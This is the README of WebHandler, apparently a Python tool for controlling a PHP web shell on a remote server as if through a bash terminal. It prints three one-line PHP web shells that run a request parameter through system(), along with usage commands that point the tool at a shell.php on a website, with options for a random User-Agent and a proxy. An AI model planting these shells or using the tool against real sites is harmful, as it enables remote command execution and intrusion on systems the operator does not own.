WebHandler - command controller for PHP system function
---
![My image](http://s9.postimage.org/6u4546aov/icommand.png)

### Info: ###
---
WebHandler is a command controller to handle PHP _program execution functions_ like system, passthru, exec and etc...
The script tries to simulate Linux bash as it works from CLI.
As of optional settings it supports HTTP proxy together with HTTP header values "User-Agent".
It sends requests to the server through urllib/urllib2 [Python][] modules.

* WebHandler works for **POST** and **GET** requests:
    - `<?php system($_GET['cmd']); ?>`
    - `<?php system($_POST['cmd']); ?>`
    - `<?php system($_REQUEST['cmd']); ?>`

### Usage: ###
---
* --url is a positional argument withing GET and POST requests:
    - python webhandler.py --url http://www.mywebsite.com/shell.php?cmd=
    - python webhandler.py --url http://www.mywebsite.com/shell.php --method POST --parameter cmd
    - python webhandler.py -u http://www.mywebsite.com/shell.php?cmd= --random-agent
    - python webhandler.py -u http://www.mywebsite.com/shell.php?cmd= --proxy http://127.0.0.1:8080

[Python]: http://www.python.org/download/
__p.s.__
---
[argparse]: http://docs.python.org/library/argparse.html
If your [Python][]'s version < 2.7.x
Then [argparse][] is required.
To install it run:
`easy_install argparse` **OR** `pip --install argparse`
